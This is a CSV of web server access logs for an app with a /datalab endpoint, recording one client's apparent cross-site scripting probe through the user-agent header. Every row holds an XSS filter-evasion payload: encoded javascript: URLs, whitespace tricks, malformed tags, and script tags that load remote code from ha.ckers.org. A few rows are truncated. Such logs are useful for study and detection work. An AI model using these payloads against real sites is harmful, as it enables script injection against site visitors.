"","X1","X2","X3","X4","X5","X6","X7","X8","X9","X10"
"147","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:37 +0000","GET / HTTP/1.1",200,1040,NA,"datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"148","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:37 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"149","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:37 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"150","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:38 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","228"
"151","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:38 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"152","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:38 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"153","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:03 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"154","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:03 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"155","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:03 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"156","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:04 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","153"
"157","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:04 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"158","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:04 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"159","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:31 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=""jav	ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"160","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:31 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav	ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"161","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:31 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav	ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"162","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:32 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav	ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","167"
"163","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:33 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav	ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"164","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:33 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav	ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"165","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:57 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","12"
"166","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:57 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"167","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:06:57 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"168","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:08:57 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"169","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:10:58 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"170","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:11:17 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"171","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:11:17 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","12"
"172","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:11:17 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"173","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:13:17 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"174","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:15:17 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"175","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:15:36 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","27"
"176","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:15:36 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","22"
"177","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:15:36 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"178","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:17:36 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"179","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:19:36 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"180","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:19:57 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=","&#14;"
"181","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:19:57 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=","&#14;"
"182","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:19:57 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=","&#14;"
"183","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:21:57 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=","&#14;"
"184","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:23:57 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=","&#14;"
"185","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:13 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","31"
"186","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:13 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","41"
"187","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:13 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","13"
"188","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:14 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","218"
"189","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:14 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"190","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:14 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"191","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:33 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"192","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:33 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","17"
"193","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:33 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"194","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:34 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","158"
"195","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:34 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"196","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:34 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","10"
"197","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:50 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"198","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:50 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"199","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:50 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"200","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:51 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","172"
"201","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:51 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"202","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:24:51 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"203","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:10 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"204","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:10 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"205","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:10 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"206","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:11 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","126"
"207","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:11 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"208","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:11 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"209","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:27 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"210","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:27 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"211","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:27 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"212","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:28 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","203"
"213","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:28 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"214","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:28 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"215","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:54 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <SCRIPT SRC=//ha.ckers.org/.j> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"216","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:54 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=//ha.ckers.org/.j> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","41"
"217","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:54 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=//ha.ckers.org/.j> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"218","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:55 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=//ha.ckers.org/.j> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","195"
